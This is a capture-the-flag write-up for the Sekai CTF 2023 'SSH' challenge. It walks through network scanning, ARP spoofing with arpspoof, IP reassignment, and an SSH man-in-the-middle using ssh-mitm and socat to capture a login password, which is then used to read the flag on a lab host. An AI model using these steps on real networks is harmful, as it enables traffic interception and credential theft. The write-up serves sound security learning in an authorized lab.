# Sekai CTF 2023 - SSH [18 solves / 468 points]

### Description
```
Jackal got tired of typing yes at every SSH prompt, clearing his known_hosts file each time the remote host's identification changes, etc., so he decided enough is enough, especially that he runs a lot of automated scripts that make use of SSH.

One day, you find yourself in the same network as Jackal and his juicy SSH server, your curiosity gets the better of you and you decide to wear your black hat once again.

You are free to do any port scans/network attacks on the 10.0.0.0/29 subnet. Your goal is to gain access to Jackal's SSH server and uncover its secrets.

Author: hfz
```

After connecting to the network with the ovpn file, we can just scan the network, and we will found 3 machines (10.0.0.1, 10.0.0.2 and 10.0.0.4), and our machine is 10.0.0.3

```
Nmap scan report for 10.0.0.1
Host is up (0.32s latency).
Not shown: 60987 closed ports, 4547 filtered ports
PORT     STATE SERVICE VERSION
1337/tcp open  waste?
MAC Address: 8A:D9:F7:4B:67:09 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/27%OT=1337%CT=2%CU=38438%PV=Y%DS=1%DC=D%G=Y%M=8AD9F7
OS:%TM=64EB415D%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%TS
OS:=A)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M52BST11NW7%O2=M5
OS:2BST11NW7%O3=M52BNNT11NW7%O4=M52BST11NW7%O5=M52BST11NW7%O6=M52BST11)WIN(
OS:W1=A9B0%W2=A9B0%W3=A9B0%W4=A9B0%W5=A9B0%W6=A9B0)ECN(R=Y%DF=Y%T=40%W=A564
OS:%O=M52BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R
OS:=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT       ADDRESS
1   318.66 ms 10.0.0.1


Nmap scan report for 10.0.0.2
Host is up (0.29s latency).
All 65535 scanned ports on 10.0.0.2 are closed (58207) or filtered (7328)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   207.69 ms 10.0.0.1
2   414.70 ms 10.0.0.2

Nmap scan report for 10.0.0.4
Host is up (0.33s latency).
Not shown: 59399 closed ports, 6135 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey: 
|   256 17:77:2c:dc:f3:24:7d:fd:00:b4:43:a7:06:26:7d:be (ECDSA)
|_  256 7d:1b:0a:e1:0f:c1:32:e8:38:bc:08:a3:d3:57:8b:0c (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/27%OT=22%CT=1%CU=30188%PV=Y%DS=2%DC=T%G=Y%TM=64EB427
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:2%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M52BST11NW7%O2=M52BST11NW7%O3
OS:=M52BNNT11NW7%O4=M52BST11NW7%O5=M52BST11NW7%O6=M52BST11)WIN(W1=A9B0%W2=A
OS:9B0%W3=A9B0%W4=A9B0%W5=A9B0%W6=A9B0)ECN(R=Y%DF=Y%T=41%W=A564%O=M52BNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=41%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=41%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=41%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=41%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=41%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=41%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=41%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
-   Hop 1 is the same as for 10.0.0.2
2   414.50 ms 10.0.0.4
```

10.0.0.1 has port 1337 opened, but I have no idea what it is, 10.0.0.2 has no port opened and 10.0.0.4 has port 22 (SSH) opened

As the description said we are free to do any network attacks, I think this challenge might be similar to the Shell Boi challenge in InCTF 2021 : https://ctftime.org/writeup/29823

So I just try to do arp spoofing to see if there's any traffic between those 3 machines, and when I try to spoof as 10.0.0.4 I discover that 10.0.0.2 is trying to connect to my machine

```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 10.0.0.4
```

![](https://i.imgur.com/Gi04vR4.png)

Then I just do arp spoofing to 10.0.0.2 and set the ip address of my interface as 10.0.0.4

```
arpspoof -i tap0 -t 10.0.0.2 10.0.0.4
ifconfig tap0 10.0.0.4 netmask 255.255.255.248
```

Then I try to listen on port 22 :

```
# nc -nlvp 22
listening on [any] 22 ...
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.2] 48394
SSH-2.0-OpenSSH_9.3
```

Looks like 10.0.0.2 is trying to connect to 10.0.0.4 through SSH

So, maybe we can try to do a MITM attack to steal the SSH creds of 10.0.0.2 when it tries to login, as the description said it will clear the known_hosts each time

I found this : https://github.com/jtesta/ssh-mitm

So just run it in docker :

```
docker pull positronsecurity/ssh-mitm
mkdir -p ${PWD}/ssh_mitm_logs && docker run --network=host -it --rm -v ${PWD}/ssh_mitm_logs:/home/ssh-mitm/log positronsecurity/ssh-mitm
```

It will be listening on port 2222, we can just use socat to redirect traffic from port 22 to port 2222 :

```
socat tcp-listen:22,reuseaddr,fork tcp:127.0.0.1:222
```

When it tries to login to our machine through SSH, we will see it's SSH creds to 10.0.0.4 :

```
# cat sftp_session_1.html 
<html><pre>Time: 2023-08-27 14:24:33 GMT
Server: 127.0.0.1:2222
Client: 127.0.0.1:58648
Username: jackal
Password: g8uigEpVuhO9mg7z
Command: :
-------------------------
```

Then just stop the arp spoofing and change the ip address of the interface back to 10.0.0.3 :

```
ifconfig tap0 10.0.0.3 netmask 255.255.255.248
```

and login to 10.0.0.4 through SSH with the stolen creds :

```
# ssh jackal@10.0.0.4
The authenticity of host '10.0.0.4 (10.0.0.4)' can't be established.
ECDSA key fingerprint is SHA256:Go31pDKyaoFMjb8V3LL4HWt5Lqp2l3i8VtLTGXCfupE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.0.4' (ECDSA) to the list of known hosts.
jackal@10.0.0.4's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

sshserver:~$ ls -la
total 20
drwxr-sr-x    1 jackal   jackal        4096 Aug 27 14:27 .
drwxr-xr-x    1 root     root          4096 Aug 26 05:55 ..
-rw-------    1 jackal   jackal           7 Aug 27 14:27 .ash_history
-rw-r--r--    1 root     root            67 Aug 26 05:54 flag.txt
sshserver:~$ cat flag.txt 
SEKAI{https://linux.livejournal.com/1884229.html_4540941f3ea0a6cd}
```